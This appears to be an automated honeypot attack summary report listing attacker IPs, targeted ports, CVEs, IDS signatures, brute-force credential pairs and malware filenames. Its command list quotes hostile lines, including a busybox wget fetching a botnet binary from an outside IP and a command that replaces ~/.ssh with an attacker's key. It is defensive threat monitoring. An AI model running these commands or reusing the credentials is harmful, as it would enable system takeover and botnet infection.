Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-01T23:01:31Z
**Timeframe Covered:** 2025-10-01T22:20:01Z to 2025-10-01T23:00:01Z
**Log Files Analyzed:**
- agg_log_20251001T222001Z.json
- agg_log_20251001T224001Z.json
- agg_log_20251001T230001Z.json

### Executive Summary

This report summarizes 18,926 events captured across the honeypot network. The majority of attacks were recorded by the Cowrie honeypot, indicating a high volume of SSH and Telnet-based brute-force and command-injection attempts. The most prominent attacker IP was `103.130.215.15`, responsible for over 30% of all recorded events. Attacks primarily targeted port 445 (SMB), with significant activity also seen on port 22 (SSH). Attackers attempted to execute various reconnaissance commands and deploy malware, with files like `arm.urbotnetisass` being common payloads. Network security signatures related to port scanning, terminal server traffic, and known malicious IP blocklists were frequently triggered.

### Detailed Analysis

**Attacks by Honeypot:**
- **Cowrie:** 8512
- **Dionaea:** 3483
- **Honeytrap:** 2743
- **Suricata:** 1568
- **Ciscoasa:** 1406
- **Mailoney:** 845
- **Tanner:** 210
- **H0neytr4p:** 40
- **Adbhoney:** 30
- **Redishoneypot:** 33
- **Sentrypeer:** 33
- **Honeyaml:** 8
- **Dicompot:** 7
- **ConPot:** 3
- **Ipphoney:** 3
- **ElasticPot:** 2

**Top Attacking IPs:**
- **103.130.215.15:** 5840
- **171.102.83.142:** 2065
- **179.1.143.50:** 1347
- **86.54.42.238:** 821
- **209.38.35.67:** 425
- **185.156.73.166:** 362
- **185.156.73.167:** 362
- **92.63.197.55:** 356
- **88.210.63.16:** 345
- **103.140.73.162:** 312
- **92.63.197.59:** 324
- **139.150.83.88:** 244

**Top Targeted Ports/Protocols:**
- **445:** 3439
- **22:** 1551
- **25:** 841
- **80:** 210
- **8333:** 160
- **23:** 92
- **TCP/80:** 82
- **5901:** 62
- **443:** 52
- **6379:** 30

**Most Common CVEs:**
- **CVE-2002-0013 CVE-2002-0012:** 12
- **CVE-2002-0013 CVE-2002-0012 CVE-1999-0517:** 8
- **CVE-2024-4577 CVE-2002-0953:** 4
- **CVE-2024-4577 CVE-2024-4577:** 4
- **CVE-2019-11500 CVE-2019-11500:** 3
- **CVE-2021-3449 CVE-2021-3449:** 3
- **CVE-2021-41773 CVE-2021-41773 CVE-2021-41773 CVE-2021-41773:** 2
- **CVE-2021-42013 CVE-2021-42013:** 2
- **CVE-2023-26801 CVE-2023-26801:** 2
- **CVE-2021-35394 CVE-2021-35394:** 2
- **CVE-2002-1149:** 2
- **CVE-2005-4050:** 1

**Commands Attempted by Attackers:**
- `cd ~; chattr -ia .ssh; lockr -ia .ssh`
- `lockr -ia .ssh`
- `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa..."`
- `uname -a`
- `cat /proc/cpuinfo | grep name | wc -l`
- `free -m | grep Mem`
- `which ls`
- `crontab -l`
- `w`
- `whoami`
- `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass...`
- `rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh...`

**Signatures Triggered:**
- **ET SCAN MS Terminal Server Traffic on Non-standard Port:** 267
- **ET DROP Dshield Block Listed Source group 1:** 247
- **ET SCAN NMAP -sS window 1024:** 160
- **ET HUNTING RDP Authentication Bypass Attempt:** 109
- **ET INFO Reserved Internal IP Traffic:** 56
- **ET CINS Active Threat Intelligence Poor Reputation IP group 41/42/43/44:** 56
- **ET DROP Spamhaus DROP Listed Traffic Inbound group 28/32:** 35

**Users / Login Attempts:**
- **345gs5662d34/345gs5662d34:** 9
- **root/nPSpP4PBW0:** 5
- **root/LeitboGi0ro:** 4
- **superadmin/admin123:** 4
- **root/2glehe5t24th1issZs:** 4
- **test/zhbjETuyMffoL8F:** 4
- **dev/88888888:** 2
- **wangchangyou/wangchangyou:** 2
- **root/!QAZ4rfv:** 2
- **root/Web@123:** 2

**Files Uploaded/Downloaded:**
- **sh:** 196
- **wget.sh;**: 8
- **arm.urbotnetisass;**: 4
- **arm.urbotnetisass**: 4
- **arm5.urbotnetisass;**: 4
- **arm5.urbotnetisass**: 4
- **arm6.urbotnetisass;**: 4
- **arm6.urbotnetisass**: 4
- **arm7.urbotnetisass;**: 4
- **arm7.urbotnetisass**: 4
- **x86_32.urbotnetisass;**: 4
- **x86_32.urbotnetisass**: 4
- **mips.urbotnetisass;**: 4
- **mips.urbotnetisass**: 4
- **mipsel.urbotnetisass;**: 4
- **mipsel.urbotnetisass**: 4
- **boatnet.mpsl;**: 2

**HTTP User-Agents:**
- *No HTTP User-Agents recorded in this period.*

**SSH Clients:**
- *No specific SSH client software recorded in this period.*

**SSH Servers:**
- *No specific SSH server software recorded in this period.*

**Top Attacker AS Organizations:**
- *No Attacker AS organization data recorded in this period.*

### Key Observations and Anomalies

- **High-Volume Scanning:** The IP address `103.130.215.15` demonstrated persistent, high-frequency scanning and attack behavior across all three log periods, suggesting an automated and dedicated adversary.
- **Malware Delivery:** A significant number of commands were aimed at downloading and executing payloads, such as `urbotnetisass` and various shell scripts (`w.sh`, `c.sh`, `wget.sh`). This indicates active attempts to compromise the system and potentially add it to a botnet.
- **Credential Stuffing:** The variety and repetition of login credentials show a clear pattern of brute-force attacks, targeting common or previously breached username/password combinations.
- **Anomalous File Downloads:** The download of a file simply named `sh` 196 times in a single 2-minute window is a notable anomaly. This likely represents a script being piped directly to the shell interpreter (`| sh`), a common technique for fileless malware execution.
- **Focus on SSH and SMB:** The concentration of attacks on ports 22 and 445 aligns with common attacker methodologies of exploiting weak credentials on remote access services and vulnerabilities in file-sharing protocols.
